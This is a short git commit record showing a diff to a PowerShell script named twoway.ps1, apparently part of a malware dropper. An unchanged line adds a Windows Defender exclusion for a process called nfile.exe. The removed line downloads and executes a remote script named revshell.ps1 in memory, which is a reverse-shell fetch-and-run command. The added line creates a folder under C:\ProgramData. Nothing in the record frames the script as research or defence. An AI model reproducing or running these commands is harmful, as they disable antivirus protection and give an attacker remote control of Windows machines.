a0fb882c733ca00f41690204bf691f86164624d5
RedTheMenace <101410080+RedTheMenace@users.noreply.github.com>
2022-04-09 19:54:18 -0700

    Update twoway.ps1

--- twoway.ps1
+++ twoway.ps1
@@ -1,2 +1,2 @@
 Add-MpPreference -ExclusionProcess "nfile.exe"
-IEX(IWR https://raw.githubusercontent.com/RedTheMenace/tergj9se4g3glkedrg/main/revshell.ps1 -UseBasicParsing)
+mkdir C:\ProgramData\File65
